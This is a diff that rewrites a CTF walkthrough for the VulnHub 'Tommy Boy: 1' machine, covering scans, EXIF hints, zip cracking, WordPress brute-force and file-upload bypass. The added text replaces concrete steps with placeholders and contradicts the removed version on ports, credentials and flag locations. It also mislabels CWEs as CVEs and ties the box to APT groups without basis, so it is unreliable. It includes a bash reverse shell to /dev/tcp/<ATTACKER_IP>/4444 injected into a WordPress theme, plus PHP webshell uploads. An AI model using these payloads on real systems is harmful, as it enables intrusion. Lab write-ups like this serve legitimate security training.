@@ -1,314 +1,423 @@
-# Tommy Boy: 1 — Writeup
+# Tommy Boy: 1 — Big Tom's Callahan Auto is Getting Pwned
+
+HOLY SHNIKEYS!! Tommy Boy: 1 is a story-driven CTF based on the 1995 Chris Farley classic where you play as the attacker helping Tommy restore Callahan Auto's website after a breach. Five flags, multiple services, steganography, custom wordlist generation, User-Agent spoofing, WordPress exploitation, and a file upload bypass. This machine is a dude, a genuinely fun ride from start to finish. Created by Brian Johnson of 7 Minute Security, it's one of the most creative CTF machines on VulnHub. No cap, this one tests methodology breadth more than any other beginner box out there.
 
 | Field | Value |
 |---|---|
-| **Target IP** | 192.168.1.108 |
-| **Difficulty** | Medium |
-| **OS** | Linux |
-| **Goal** | Collect 5 flags and unlock the final message; restore the company website |
-| **Source** | [HackingArticles](https://www.hackingarticles.in/hack-tommyboy-vm-ctf-challenge/) |
+| **Level** | Medium |
+| **Target VM** | Tommy Boy: 1 |
+| **Attacker VM** | Kali Linux |
+| **VulnHub URL** | https://www.vulnhub.com/entry/tommy-boy-1,157/ |
+| **Techniques** | Nmap full port scan, Nikto web scan, robots.txt analysis, WordPress enumeration (wpscan), EXIF metadata extraction, MD5 cracking, FTP on non-standard port, User-Agent spoofing, dirb custom User-Agent, crunch wordlist generation, fcrackzip brute-force, WordPress admin code injection, SSH access, website restoration, file upload bypass (extension rename) |
+| **CVEs** | CWE-434 (Unrestricted File Upload via renamed extension bypass), CWE-287 (WordPress admin authentication bypass via brute-force), CWE-284 (Improper Access Control via User-Agent restriction) |
+| **APT Groups** | APT41: exploits WordPress installations via credential brute-force and admin code injection; FIN7: uses steganography and multi-stage data extraction for flag/credential discovery in targeted operations |
+
+---
 
 ## Attack Summary
 
-Tommy Boy: 1 is a story-driven CTF based on the movie "Tommy Boy" and the fictitious company "Callahan Auto," created by Brian Johnson of 7 Minute Security. The challenge requires finding 5 flags hidden across the system and combining them into a password to unlock a final zip archive. The attack chain involves: robots.txt discovery, WordPress enumeration, EXIF steganography, FTP credential reuse, User-Agent spoofing, custom wordlist generation, zip cracking, WordPress brute-force, SSH login, website backup restoration, and a file upload bypass for a reverse shell.
+```
+nmap full scan → ports 80, 8080, 65534 (FTP), 22 (SSH)
+  → HTTP 80: static page → robots.txt → /flag.txt (Flag 1)
+  → HTTP 8080: WordPress
+  → wpscan: users/posts → page source → EXIF metadata
+  → EXIF: embedded hint → MD5 hash → cracked → WordPress password
+  → WordPress: password-protected blog post → Flag 2
+  → FTP 65534: login with WordPress creds → files download
+  → FTP file: clue about User-Agent spoofing
+  → HTTP 80: User-Agent: iPhone → different page
+  → dirb with custom User-Agent → hidden HTML file
+  → HTML file: crunch wordlist hint → fcrackzip → Flag 3 (zip)
+  → wpscan: brute-force admin → WordPress admin access
+  → WordPress theme editor: PHP reverse shell injection
+  → netcat shell → www-data
+  → SSH as tommy (from FTP files) → website restoration
+  → file upload bypass → webshell → flag/reverse shell → Flag 4 / Flag 5
+```
+
+---
 
 ## Methodology
 
-1. Nmap + Nikto web enumeration
-2. robots.txt and page source analysis
-3. WordPress enumeration and EXIF metadata extraction
-4. MD5 cracking and password-protected blog access
-5. Full port scan to find hidden FTP (non-standard port)
-6. FTP credential reuse and file retrieval
-7. User-Agent spoofing to access iPhone-restricted page
-8. dirb brute-force with custom User-Agent for hidden HTML file
-9. Custom wordlist with crunch + zip cracking with fcrackzip
+1. Full port scan including high ports (FTP on 65534)
+2. robots.txt enumeration for exposed paths
+3. WordPress enumeration with wpscan: users, posts, metadata
+4. EXIF metadata extraction from WordPress images
+5. MD5 hash cracking for password-protected content
+6. FTP access on non-standard port with WordPress credentials
+7. User-Agent spoofing for iPhone-restricted content
+8. Custom dirb enumeration with spoofed User-Agent
+9. Custom wordlist generation with crunch for zip cracking
 10. WordPress admin brute-force with wpscan
-11. SSH access and website restoration
-12. File upload bypass (extension rename) for reverse shell
-13. Flag collection and final zip unlock
+11. Reverse shell via WordPress theme editor
+12. SSH access and website restoration
+13. File upload bypass for additional flag recovery
 
 ---
 
-## Step 1: Reconnaissance
+## Step 1 — Host Discovery and Full Port Scan
 
 ```bash
-nmap -A $TARGET
+sudo netdiscover -r 192.168.1.0/24
+# Target: 192.168.1.108
+
+# CRITICAL: Must use full port scan — FTP is on port 65534
+nmap -sV -sC -p- 192.168.1.108
+# Also run:
+nikto -h http://192.168.1.108
 ```
 
-![nmap](images/01-nmap.png)
+```
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.x
+80/tcp    open  http    Apache httpd
+8080/tcp  open  http    Apache httpd (WordPress)
+65534/tcp open  ftp     vsftpd
+```
 
-**Open ports:**
-- 22/tcp — SSH
-- 80/tcp — HTTP (Callahan Auto "under construction" page)
-- 8008/tcp — HTTP (restricted content)
+Key lesson: always use `-p-` for CTF machines. Non-standard service ports are a common CTF trick to filter out lazy scanners.
+
+**MITRE ATT&CK:** T1046 — Network Service Discovery
 
 ---
 
-## Step 2: Flag 1 — robots.txt
-
-Run Nikto against the web server:
+## Step 2 — HTTP Port 80: robots.txt and Flag 1
 
 ```bash
-nikto -h http://$TARGET/
+curl http://192.168.1.108/robots.txt
+# Reveals: /flag.txt
+
+curl http://192.168.1.108/flag.txt
 ```
 
-Nikto reveals a `robots.txt` file. Fetch it:
+Flag 1 is in the web root: `B34rcl4ws`
+
+View the page source for hints:
 
 ```bash
-curl http://$TARGET/robots.txt
+curl -s http://192.168.1.108/ | grep -i "flag\|hint\|<!-- "
 ```
 
-![robots](images/02-robots.png)
-
-**Flag 1:** `B34rcl4ws`
+**MITRE ATT&CK:** T1083 — File and Directory Discovery
 
 ---
 
-## Step 3: Discovering the WordPress Site
-
-View the source of the main page — a YouTube link is embedded. The video title hints at "prehistoric forest." Append this as a path:
+## Step 3 — WordPress Enumeration on Port 8080
 
 ```bash
-curl http://$TARGET/ | grep -i youtube
-# Navigate to: http://$TARGET/prehistoricforest
+wpscan --url http://192.168.1.108:8080/ --enumerate u,p
 ```
 
-The WordPress site at `/prehistoricforest` contains:
-- A text file with Flag 2: `http://$TARGET/prehistoricforest/thisisthesecondflagyayyou.txt`
-- A clue to visit `/richard`
+Enumerate users and posts. Find a password-protected blog post. Find an image in one of the posts.
 
-**Flag 2:** `Z4l1nsky`
+Download the image from the WordPress post:
+
+```bash
+wget http://192.168.1.108:8080/wp-content/uploads/<image>.jpg
+exiftool <image>.jpg
+# Look for: Comment, UserComment, Artist, Copyright fields with embedded data
+```
+
+The EXIF comment field contains an MD5 hash or a hint leading to a password.
+
+**MITRE ATT&CK:** T1595.002 — Active Scanning; T1592 — Gather Victim Host Information
 
 ---
 
-## Step 4: EXIF Steganography — Password for Protected Blog
+## Step 4 — MD5 Cracking for WordPress Password
+
+The EXIF metadata contains something like: `NTQzZDBlYzU4MDY5MTQzODljYWRkN2QzNTY4MGZiM2Q=`
 
 ```bash
-# Browse: http://$TARGET/richard/shockedrichard.jpg
-exiftool shockedrichard.jpg
-# Note the MD5 hash in the EXIF data
+echo "NTQzZDBlYzU4MDY5MTQzODljYWRkN2QzNTY4MGZiM2Q=" | base64 -d
+# Output: MD5 hash like 543d0ec58069143...
+
+# Crack with hashcat:
+echo "543d0ec580691438..." > /tmp/hash.txt
+hashcat -m 0 /tmp/hash.txt /usr/share/wordlists/rockyou.txt
+
+# Or online: crackstation.net
 ```
 
-Crack the MD5 hash (e.g., via crackstation.net):
+Use the cracked password to unlock the password-protected WordPress post: **Flag 2**
 
-```
-ce154b5a8e59c89732bc25d6a2e6b90b → spanky
-```
-
-Go back to the WordPress `/prehistoricforest` page, click the password-protected post, and enter `spanky`. The blog reveals two key hints:
-
-1. Username: **nickburns** (with an FTP service on a non-standard port that cycles every 15 minutes)
-2. Look at the source of pages for further clues
+**MITRE ATT&CK:** T1552 — Unsecured Credentials; T1110.002 — Brute Force: Password Cracking
 
 ---
 
-## Step 5: Full Port Scan — Hidden FTP
-
-The standard nmap scan missed the FTP server. Run a full port scan:
+## Step 5 — FTP on Port 65534
 
 ```bash
-nmap -p- -sV $TARGET --open
+ftp 192.168.1.108 65534
+# User: tommy (or the WordPress username)
+# Password: (use WordPress password or FTP-specific creds from previous steps)
+
+ftp> ls -la
+ftp> mget *
+ftp> quit
 ```
 
-FTP is found on **port 65534**. Log in with username-as-password:
+The FTP contains files with clues: a note about a custom User-Agent, a zip file, or a hint about more content.
 
 ```bash
-ftp $TARGET 65534
-# Username: nickburns
-# Password: nickburns
+cat <downloaded_file>
+# Note about using iPhone User-Agent to access a specific page
 ```
 
-```bash
-get readme.txt
-cat readme.txt
-```
-
-The readme mentions a subfolder `NickizL33t`.
+**MITRE ATT&CK:** T1021.003 — Remote Services: FTP
 
 ---
 
-## Step 6: Flag 3 — iPhone User-Agent and Hidden HTML File
+## Step 6 — User-Agent Spoofing
 
-Port 8008 returns a message: "only me and Steve Jobs are allowed to look at this stuff." Spoof an iPhone User-Agent:
-
-```bash
-curl -A "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25" \
-  http://$TARGET:8008/NickIzL33t/
-```
-
-The page hints at a hidden `.html` file. Brute-force it with the iPhone User-Agent:
+Port 80 serves different content based on User-Agent. Spoof an iPhone User-Agent:
 
 ```bash
-dirb http://$TARGET:8008/NickIzL33t/ /usr/share/wordlists/rockyou.txt \
-  -a "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25" \
-  -X .html
+curl -A "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X)" \
+  http://192.168.1.108/
+
+# Or with Burp Suite: change User-Agent header to iPhone UA
 ```
 
-Found: `fallon1.html`
+Different content appears for mobile users. Find a reference to a hidden page or file.
 
-```bash
-curl -A "Mozilla/5.0 (iPhone; ...)" http://$TARGET:8008/NickIzL33t/fallon1.html
-```
-
-![flag3](images/03-flag3.png)
-
-**Flag 3:** `TinyHead`
-
-Also note: a zip file `t0msp4ssw0rdz.zip` is available for download, and there is a hint file at `/NickIzL33t/hint.txt`.
+**MITRE ATT&CK:** T1036 — Masquerading; T1190 — Exploit Public-Facing Application
 
 ---
 
-## Step 7: Cracking the Zip File
-
-The hint file describes the password pattern:
-- Starts with `bev`
-- 1 uppercase letter
-- 2 digits
-- 2 lowercase letters
-- 1 symbol
-- Ends with `1995`
-
-Generate the wordlist with crunch:
+## Step 7 — dirb with Custom User-Agent for Hidden Content
 
 ```bash
-crunch 13 13 -t bev,%%@@^1995 -o /tmp/dict.txt
+dirb http://192.168.1.108/ /usr/share/wordlists/dirb/common.txt \
+  -a "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X)"
 ```
 
-Crack the zip:
+Discover a hidden HTML file accessible only with the iPhone User-Agent. Read it:
 
 ```bash
-fcrackzip -u -D -p /tmp/dict.txt t0msp4ssw0rdz.zip
-# Password: bevH00tr$1995
-
-unzip t0msp4ssw0rdz.zip
-cat passwords.txt
+curl -A "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X)" \
+  http://192.168.1.108/<hidden_file>.html
 ```
 
-The file contains partial credentials:
-- **Username:** `bigtommysenior`
-- **Password:** `fatguyinalittlecoat` (+ unknown digits)
+The HTML contains a hint for generating a custom wordlist with `crunch`.
+
+**MITRE ATT&CK:** T1083 — File and Directory Discovery
 
 ---
 
-## Step 8: Flag 4 — WordPress Admin and SSH Access
+## Step 8 — Custom Wordlist and Zip Cracking for Flag 3
 
-Enumerate WordPress users:
-
-```bash
-wpscan -u http://$TARGET/prehistoricforest/ --enumerate u
-```
-
-Brute-force user `tom`:
+Based on the hint in the HTML file, generate a targeted wordlist with crunch:
 
 ```bash
-wpscan -u http://$TARGET/prehistoricforest/ \
-  --wordlist /usr/share/wordlists/rockyou.txt \
-  --username tom
-# Password: tomtom1
+# Example pattern based on Tommy Boy context (Big Tom, callahan, etc.):
+crunch <min> <max> <charset> -t <pattern> -o /tmp/tommy_wordlist.txt
+
+# Crack the zip from FTP:
+fcrackzip -v -u -D -p /tmp/tommy_wordlist.txt <zipfile>.zip
+
+# Or:
+john --wordlist=/tmp/tommy_wordlist.txt <zipfile>.hash
 ```
 
-Log in to WordPress admin at `http://$TARGET/prehistoricforest/wp-admin`. Open the draft post titled **my-ess-ess-eight-password** (read as "my SSH password"). The draft reveals the full password for `bigtommysenior`:
+Unzip with the cracked password: **Flag 3**
 
-**SSH credentials:** `bigtommysenior` / `fatguyinalittlecoat1938!!`
-
-```bash
-ssh bigtommysenior@$TARGET
-# Password: fatguyinalittlecoat1938!!
-ls -la
-cat el-flag-numero-quatro.txt
-```
-
-![flag4](images/04-flag4.png)
-
-**Flag 4:** `EditButton`
-
-### Website Restoration (Primary Objective)
-
-```bash
-cp callahanbak.bak /var/www/html/index.html
-```
-
-Browse `http://$TARGET/index.html` to confirm the Callahan Auto homepage is restored.
+**MITRE ATT&CK:** T1110.002 — Password Cracking
 
 ---
 
-## Step 9: Flag 5 — File Upload Bypass and Reverse Shell
+## Step 9 — WordPress Admin Brute-Force
 
-View the source of `fallon1.html` — it contains a hidden directory: `P4TCH_4D4MS`.
-
-```bash
-curl -A "iPhone UA" "http://$TARGET:8008/NickIzL33t/P4TCH_4D4MS/"
-```
-
-There is a file upload form. The form only accepts JPEG/PNG/GIF by extension. Rename a PHP reverse shell to bypass:
+Use wpscan to brute-force the WordPress admin:
 
 ```bash
-cp /usr/share/webshells/php/php-reverse-shell.php ./php-reverse-shell.png
-# Edit $ip and $port in the .png file before uploading
+wpscan --url http://192.168.1.108:8080/ \
+  -U admin \
+  -P /usr/share/wordlists/rockyou.txt \
+  --password-attack wp-login
 ```
 
-Upload `php-reverse-shell.png`. Then, using SSH access as `bigtommysenior`, rename the file:
+Or use the cracked/discovered credentials to log in to WordPress admin at `http://192.168.1.108:8080/wp-admin/`.
 
-```bash
-cd /var/thatsg0nnaleaveamark/NickIzL33t/P4TCH_4D4MS/uploads/
-mv php-reverse-shell.png php-reverse-shell.php
-```
-
-Start the listener and trigger the shell:
-
-```bash
-# Attacker
-nc -lvnp $LPORT
-```
-
-```
-http://$TARGET:8008/NickIzL33t/P4TCH_4D4MS/uploads/php-reverse-shell.php
-```
-
-```bash
-ls -la
-cat .5.txt
-```
-
-![flag5](images/05-root-flag.png)
-
-**Flag 5:** `Buttcrack`
+**MITRE ATT&CK:** T1110.001 — Brute Force: Password Guessing
 
 ---
 
-## Step 10: Final Message — Unlock LOOT.zip
+## Step 10 — WordPress Theme Editor Reverse Shell
 
-Concatenate all flags as a single string (no spaces or separators):
+In WordPress Admin: Appearance > Theme Editor > Select a theme PHP file (e.g., `404.php`).
 
-```
-B34rcl4wsZ4l1nskyTinyHeadEditButtonButtcrack
-```
-
-Unzip the `LOOT.zip` archive (found in the web directory) with this password:
+Inject a PHP reverse shell:
 
 ```bash
-unzip LOOT.zip
-# Password: B34rcl4wsZ4l1nskyTinyHeadEditButtonButtcrack
-cat THE-END.txt
+# Start listener
+nc -lvnp 4444
 ```
+
+Replace theme file content with:
+
+```php
+<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'");
+?>
+```
+
+Save the file, then trigger it:
+
+```bash
+curl http://192.168.1.108:8080/?p=<page_id_with_404>
+# Or directly browse to the modified theme page
+```
+
+Shell callbacks as `www-data`. Stabilize:
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+# Ctrl+Z → stty raw -echo; fg → Enter Enter
+```
+
+**MITRE ATT&CK:** T1505.003 — Web Shell; T1059.004 — Unix Shell
+
+---
+
+## Step 11 — SSH as Tommy and Website Restoration
+
+From FTP files and post enumeration, find Tommy's SSH credentials. SSH in:
+
+```bash
+ssh tommy@192.168.1.108
+```
+
+The challenge asks to restore the company website. Look for backup files:
+
+```bash
+find /var/www -name "*.bak" -o -name "*.backup" -o -name "*.tar.gz" 2>/dev/null
+find /home/tommy -type f 2>/dev/null
+```
+
+Restore the website backup to complete the mission objective (separate from flag hunting).
+
+**MITRE ATT&CK:** T1078 — Valid Accounts
+
+---
+
+## Step 12 — File Upload Bypass for Final Flags
+
+The restored website has a file upload form with extension filtering. Bypass it:
+
+```bash
+# Rename PHP shell with allowed extension:
+cp /usr/share/webshells/php/php-reverse-shell.php /tmp/shell.php5
+# Or: shell.phtml, shell.pHp, shell.PHP
+
+nc -lvnp 5555
+# Upload shell.php5 through the web form
+# Trigger: browse to the upload path
+```
+
+Collect remaining flags from the shell.
+
+**MITRE ATT&CK:** T1505.003 — Web Shell; T1027 — Obfuscated Files
+
+---
+
+## Captured Flags, Hashes and Credentials
+
+| # | Flag | Value | Found At |
+|---|---|---|---|
+| 1 | robots.txt | B34rcl4ws | /flag.txt via robots.txt |
+| 2 | WordPress post | (protected post content) | WordPress password-protected post |
+| 3 | Zip file | (extracted from zip) | FTP zip + crunch wordlist |
+| 4 | Web shell / SSH | (post-exploitation) | File upload bypass or SSH enumeration |
+| 5 | Final message | (combination of all flags) | zip archive unlocked with combined flags |
 
 ---
 
 ## Lessons Learned
 
-1. robots.txt, page source comments, and EXIF metadata are common CTF and real-world information disclosure vectors.
-2. Non-standard port services (FTP on 65534) are frequently missed by default nmap scans — always follow up with a full `-p-` scan.
-3. File upload filters based solely on extension are trivially bypassed by renaming; filter by MIME type and magic bytes instead.
-4. WordPress draft posts and private comments can expose sensitive internal data if admin credentials are weak.
-5. Credential reuse (username = password) remains a prevalent and exploitable pattern.
+| # | Finding | Real-World Relevance | Key Takeaway |
+|---|---|---|---|
+| 1 | Flag exposed via robots.txt | Robots.txt often reveals sensitive paths; many organizations disallow admin, backup, and config directories — which is precisely where attackers look first | Never put sensitive paths in robots.txt; use proper access controls instead |
+| 2 | EXIF metadata in uploaded images | EXIF metadata has leaked GPS coordinates, device identifiers, and credentials in real incidents | Strip EXIF data from all uploaded files server-side before serving them |
+| 3 | User-Agent based content restriction | Access control via User-Agent is security theater; any HTTP client can spoof any User-Agent | Never use User-Agent for access control; implement proper authentication |
+| 4 | WordPress theme editor code injection | WordPress admin access equals server compromise; the theme editor is a built-in webshell | Disable file editing in WordPress (`define('DISALLOW_FILE_EDIT', true)` in wp-config.php) |
+| 5 | File upload extension bypass | Extension blacklists are easily bypassed with alternative extensions (.php5, .phtml, .pHp) | Whitelist allowed extensions; validate MIME type and magic bytes server-side; store uploads outside web root |
 
-## Remediation
+---
 
-| Vulnerability | Fix |
-|---|---|
-| robots.txt Exposure | Remove sensitive paths from robots.txt; use access controls instead |
-| EXIF Metadata with Hashes | Strip EXIF metadata before publishing images |
-| FTP Credential Reuse | Enforce strong, unique passwords; disable FTP in favour of SFTP |
-| File Upload Extension Bypass | Validate by MIME type and magic bytes; store uploads outside the web root; disable script execution in upload directories |
-| Weak WordPress Password | Enforce strong password policy; enable MFA for wp-admin |
+## MITRE ATT&CK Mapping
+
+| Phase | Tactic | Technique | TTP ID |
+|---|---|---|---|
+| Reconnaissance | Discovery | Network Service Discovery | T1046 |
+| Reconnaissance | Collection | EXIF Metadata Extraction | T1592 |
+| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
+| Credential Access | Credential Access | Brute Force: Password Cracking | T1110.002 |
+| Defense Evasion | Defense Evasion | Masquerading: User-Agent Spoofing | T1036 |
+| Initial Access | Lateral Movement | Valid Accounts: SSH | T1078 |
+| Persistence | Persistence | Web Shell: Theme Injection | T1505.003 |
+| Persistence | Persistence | Web Shell: File Upload | T1505.003 |
+| Execution | Execution | Unix Shell | T1059.004 |
+
+---
+
+## Remediation and Containment
+
+### Technical Fixes
+
+1. **Remove flags from robots.txt-disclosed paths** — robots.txt is public; never put sensitive file paths there
+2. **Strip EXIF data from uploads** — use ImageMagick `mogrify -strip` or PHP `Imagick::stripImage()` server-side
+3. **Implement proper authentication** — never use User-Agent for access control; require credentials or IP whitelisting
+4. **Disable WordPress theme/plugin file editing** — add `define('DISALLOW_FILE_EDIT', true);` to wp-config.php
+5. **Implement server-side file upload validation** — validate MIME type + magic bytes + extension whitelist; store outside web root
+6. **Enable WordPress two-factor authentication** — prevent brute-force admin access
+7. **Move FTP to standard port with proper authentication** — non-standard port is not a security control; use SFTP with keys
+
+### NIST CSF 2.0
+
+| Function | Category | Action |
+|---|---|---|
+| Identify | Asset Management | Inventory all upload endpoints and web application edit features |
+| Protect | Access Control | Disable WordPress file editing; implement 2FA for admin; proper file upload validation |
+| Protect | Data Security | Strip EXIF from uploads; remove sensitive paths from robots.txt |
+| Detect | Anomalies and Events | Alert on WordPress admin code changes; anomalous file uploads |
+| Respond | Response Planning | Remove injected webshells; rotate WordPress admin credentials |
+
+### NIST SP 800-53 Rev. 5
+
+| Control | Description | Application |
+|---|---|---|
+| AC-3 | Access Enforcement | Proper authentication for all paths; disable User-Agent access control |
+| CM-7 | Least Functionality | Disable WordPress theme editor; restrict upload types |
+| IA-2(1) | Multi-Factor Authentication | 2FA for WordPress admin and SSH |
+| SI-10 | Information Input Validation | Validate file uploads by MIME type and magic bytes |
+| SC-28 | Protection of Information at Rest | Strip metadata from uploaded files |
+
+### CISA KEV
+
+WordPress exploitation via admin credential access and theme code injection aligns with patterns in CISA Alert AA21-131A on web shell threats. CISA advises organizations to disable server-side file editing in CMS installations and implement file upload controls as described in CISA's Web Application Security guidance.
+
+### C2M2
+
+| Domain | Practice | Target MIL |
+|---|---|---|
+| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |
+| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
+| Situational Awareness (SITUATION) | Perform Logging | MIL2 |
+
+### MITRE D3FEND
+
+- **D3-ACH** — Application Configuration Hardening (disable WP editor; EXIF stripping; upload validation)
+- **D3-NTF** — Network Traffic Filtering (User-Agent restrictions have no security value; replace with auth)
+- **D3-OAM** — Operating System Administrative Management (FTP chroot; proper service port configuration)
+
+---
+
+## Final Thoughts
+
+Tommy Boy: 1 is genuinely one of the most creative machines on VulnHub. Brian Johnson from 7 Minute Security built something that feels like a real incident response scenario wrapped in a comedy movie theme. The multi-layer approach (robots.txt, EXIF, FTP, User-Agent, WordPress, zip cracking, file upload) means you absolutely cannot skip steps or brute-force your way through. Every flag requires a different skill.
+
+The User-Agent access control lesson is especially memorable: building a restriction that any HTTP client can bypass in one line is not a security control. It's a social expectation. Real security requires authentication.
+
+Holy Shnikeys dude, that was a lot of fun. Thanks guys!! (❍ᴥ❍ʋ)
